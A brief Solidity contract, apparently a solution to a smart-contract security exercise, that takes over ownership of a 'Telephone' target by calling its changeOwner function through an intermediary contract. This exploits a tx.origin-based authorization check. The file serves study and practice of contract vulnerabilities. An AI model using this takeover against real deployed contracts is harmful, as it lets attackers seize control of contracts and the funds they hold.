// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Solution {
    function attack(address _telephone) public {
        Telephone _target = Telephone(_telephone);
        _target.changeOwner(msg.sender);
    }
}
